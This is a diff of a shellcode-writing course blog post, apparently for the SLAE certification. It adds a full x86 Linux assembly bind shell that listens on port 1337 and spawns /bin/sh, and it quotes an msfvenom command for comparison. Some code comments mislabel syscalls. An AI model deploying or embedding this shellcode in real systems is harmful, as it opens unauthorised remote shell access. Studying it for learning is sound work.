@@ -36,7 +36,7 @@ Each serve a purpose in creating our bind shell.
 
 ### Referencing MSF Goodies
 ```msfvenom -p linux/x86/shell_bind_tcp -f raw| ndisasm -u -``` produces a bind shell payload the size of 78 bytes for
-us to compare our generated shellcode to:
+us to compare to our generated shellcode:
 
 ```nasm
 xor ebx,ebx  
@@ -240,7 +240,77 @@ mov al, 0xb		; execve call
 int 0x80 		; Execute SHELL
 ```
 
+# Complete Assembly Program
 
+```nasm
+; shell_bind_tcp.nasm
+; Author: Vincent Mentz
+
+global _start	; Standard start
+		;
+section .text	;
+_start:		;
+	
+	;socket
+	xor ebx, ebx	; Zero out registers before usage to avoid a logic error
+	xor ecx, ecx	;
+	xor edx, edx	;
+	xor edi, edi	;
+	mul cx		; ax = ax * cx (0)
+	mov eax, 0x167	; socket syscall	
+	mov bl, 2	; socket_family=AF_INET (0x2)
+	mov cl, 1	; socket_type=SOCK_STREAM (0x1)
+	mov dl, 0	; protocol=IPPROTO_IO (0x0) [edx was already 0]
+	int 0x80	; interrupt
+
+	;bind
+	mov esi, eax	 ; store sockfd in esi for later use
+	push esi	 ; store sockfd on stack
+	mov eax, 0x169   ; bind syscall
+	pop ebx 	 ; pop sockfd off stack into ebx
+	push edi	 ; push 0x00000000 (0.0.0.0) / sin.addr [last arg] to stack
+	push word 0x0539 ; push port 1337 to stack / sin_port
+	push word 0x0002 ; push AF_INET/IPV4 [2] to stack / sin_family
+	mov ecx, esp	 ; mov pointer of stack to ecx
+	mov edx, 0x10	 ; mov 16 bit address length to edx
+	int 0x80	 ; execute interrupt 
+
+	;listen
+	push 0x16B	; bind syscall
+	pop eax		; mov bind to eax
+	mov ebx, esi	; mov sockfd into ebx
+	mov ecx, 5	; set a backlog of 5 
+	int 0x80	; interrupt 
+
+	;accept4
+	mov eax, 0x16C	; accept4 syscall
+	xor ecx, ecx	; 0x00 sockaddr
+	xor edx, edx	; 0x00 addrlen
+	xor esi, esi	; 0x00 flags
+	int 0x80	; interrupt
+
+	;dup2
+	mov ecx, 0x3	; setting up a counter for the loop to iterate through
+	mov esi, eax	; preserve old sockfd from accept4
+	sockfd_func:	; create a function to reproduce the same actions
+	mov eax, 0x3F	; dup2 call
+	mov ebx, esi	; restore sockfd to oldfd arguement
+	dec cl		; decrement ecx to 2 then 1 then 0
+	int 0x80	; interrupt
+	jnz sockfd_func ; loop back to sockfd_func if not zero
+
+	;execve
+	xor ecx, ecx
+	push cx
+	push dword 0x68732f2f	; push / / s h
+	push dword 0x6e69622f 	; push / b i n
+	mov ebx, esp		; Store pointer to "/bin/sh" in ebx
+	push ecx 		; Push NULL
+	push ebx 		; Push *filename
+	mov ecx, esp 		; Store memory address pointing to memory address of "/bin/sh"
+	mov al, 0xb		; execve call
+	int 0x80 		; Execute SHELL
+```
 
 
 
@@ -251,4 +321,4 @@ _This blog post has been created for completing the requirements of the Security
 <http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>
 
 _Student ID: SLAE-1469_
-
+OA
